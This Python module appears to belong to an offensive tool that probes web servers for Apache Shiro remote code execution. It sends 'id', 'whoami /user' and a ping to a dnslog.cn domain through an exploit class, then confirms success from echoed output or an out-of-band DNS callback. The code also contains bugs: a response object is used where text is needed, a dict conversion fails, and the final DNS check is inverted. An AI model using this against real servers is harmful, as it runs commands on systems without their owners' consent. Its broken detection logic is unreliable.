#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
File:   :   ShiroRceChecker.py
Time    :   2021/09/15 17:18:27
Author  :   Hack3rHan
Contact :   Hack3rHan@protonmail.com
"""
import re
import requests

from colorama import Fore
from core.Exploit import Exploit


class Checker(object):

    def __init__(self, url: str, is_tomcat: bool = False):
        self.url = url
        self.is_tomcat = is_tomcat

    def run(self):
        self._send_check_request()

    def _send_check_request(self):
        dnslog_session = requests.session()

        try:
            dnslog_domain = dnslog_session.get('http://dnslog.cn/getdomain.php', timeout=10)
        except Exception:
            print(Fore.RED + '[!] ERROR: Can not get a domain from dnslog.cn')
            return

        cmd = 'ping {}'.format(dnslog_domain)

        if self.is_tomcat:
            exp = Exploit(url=self.url, cmd='id', echo=True)
            for resp_content in exp.send_echo_exp():
                if re.search(b'uid=.*?gid=.*?groups=.*?', resp_content):
                    print(Fore.GREEN + '[*] INFO: Target is Vulnerable. (ECHO)')
                    return
            exp = Exploit(url=self.url, cmd='whoami /user', echo=True)
            for resp_content in exp.send_echo_exp():
                if re.search(b'S-\d-\d{1,3}-\d+-\d+-\d+', resp_content):
                    print(Fore.GREEN + '[*] INFO: Target is Vulnerable. (ECHO)')
                    return

        exp = Exploit(url=self.url, cmd=cmd, echo=False)
        exp.send_noecho_exp()
        try:
            resp = dnslog_session.get('http://dnslog.cn/getrecords.php', timeout=10)
            res = dict(resp.text)
        except Exception:
            print(Fore.RED + '[!] ERROR: Can not get dnslog records from dnslog.cn')
            return

        if not res:
            print(Fore.GREEN + '[*] INFO: Target is Vulnerable. (DNSLOG)')
        else:
            print(Fore.GREEN + '[*] INFO: Target may be not vulnerable. (DNSLOG)')
